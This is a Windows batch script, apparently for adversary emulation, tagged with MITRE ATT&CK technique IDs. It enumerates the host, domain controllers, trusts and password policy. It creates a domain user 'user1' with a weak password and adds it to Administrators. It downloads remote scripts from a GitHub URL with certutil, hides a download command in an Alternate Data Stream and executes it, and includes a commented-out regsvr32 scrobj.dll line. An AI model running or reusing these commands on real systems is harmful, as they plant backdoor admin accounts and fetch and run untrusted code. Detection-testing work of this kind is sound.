@ECHO OFF

echo  
echo [*] machine/user information
hostname
whoami

echo  
echo  

:: Mitre:T1080
echo [*] system details  
systeminfo | findstr /c:"OS Name"
systeminfo | findstr /c:"OS Version"
systeminfo | findstr /c:"System Type"
systeminfo | findstr /c:"Domain"

echo  
echo  
:: Mitre T1018, T1135, T1482
:: Enumeration of the trust relationship between the workstation and the domain
echo [*] domain enumeration
nltest /sc_query:lab
echo  

nltest /dclist:lab
echo  

nltest /dcname:lab
echo  

nltest /sc_reset:lab

echo  
echo  

:: Mitre:T1201
:: Indicates whether there is evidence of the process trying to perform password policy discovery
echo [*] dumping password policy 
net accounts

echo [*] checking localgroup 
net localgroup

echo [*] dumping Administrator account info 
net user Administrator

echo  
echo  

echo [*] Creating a domain user  
net user user1 admin123 /add /domain
echo  
echo [*] Adding user to Administraors group
net localgroup Administrators user1 /add

echo  
:: Mitre:T1105
certutil.exe -urlcache -split -f https://raw.githubusercontent.com/jozems/sec/master/hli.script hli.script

:: Mitre:T1170
:: Add content to ADS [Alternate Data Streams]
::cmd.exe /c echo regsvr32.exe ^/s ^/u ^/i:https://raw.githubusercontent.com/jozems/sec/master/exec.bat ^scrobj.dll > usualfile.txt:payload.bat
cmd.exe /c echo certutil.exe -urlcache -split -f https://raw.githubusercontent.com/jozems/sec/master/exec.bat exec.bat > usualfile.txt:payload.bat

::exec it
cmd.exe - < usualfile.txt:payload.bat



